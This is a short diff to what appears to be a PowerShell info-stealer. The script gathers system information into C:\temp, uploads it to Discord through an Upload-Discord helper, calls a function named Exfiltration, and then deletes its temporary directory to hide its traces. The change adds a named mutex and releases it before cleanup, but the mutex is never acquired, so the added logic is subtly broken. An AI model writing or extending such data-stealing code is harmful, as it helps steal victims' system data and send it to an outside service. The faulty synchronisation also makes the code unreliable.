@@ -112,6 +112,10 @@ function SysInfo {
     Upload-Discord -file "C:\temp\System_Informations.txt" -text "System Informations :"
 }
 
+# Ajoute une variable de synchronisation
+$SyncLock = [System.Threading.Mutex]::new($false, 'SyncLock')
+
+
 # Function to delete the temporary directory
 function DelTempDir {
     Set-Location -Path "C:\"
@@ -126,6 +130,9 @@ function DelTempDir {
 
 # Call Exfiltration
 Exfiltration
+
+# Libère la variable de synchronisation pour permettre à DelTempDir de s'exécuter
+$SyncLock.ReleaseMutex()
 
 # Call DelTempDir
 DelTempDir
